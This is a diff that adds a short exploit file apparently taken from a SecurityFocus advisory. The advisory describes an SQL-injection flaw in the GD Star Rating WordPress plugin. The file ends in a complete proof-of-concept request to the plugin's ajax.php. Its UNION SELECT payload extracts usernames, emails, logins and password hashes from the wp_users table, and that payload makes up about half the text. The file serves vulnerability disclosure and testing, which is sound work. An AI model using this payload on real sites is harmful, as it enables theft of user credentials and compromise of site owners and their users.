@@ -1,0 +1,8 @@
+source: http://www.securityfocus.com/bid/48166/info
+
+The GD Star Rating plugin for WordPress is prone to an SQL-injection vulnerability because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.
+
+Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database. 
+
+http://www.example.com/wp-content/plugins/gd-star-rating/ajax.php?_wpnonce=<insert_valid_nonce>&vote_type=cache&vote_domain=a&votes=asr.1.xxx.1.2.5+limit+0+union+select+1,0x535242,1,1,co
+ncat(0x613a313a7b733a363a226e6f726d616c223b733a323030303a22,substring(concat((select+concat(user_nicename,0x3a,user_email,0x3a,user_login,0x3a,user_pass)+from+wp_users+where+length(user_pass)%3E0+order+by+id+limit+0,1),repeat(0x20,2000)),1,2000),0x223b7d),1,1,1+limit+1
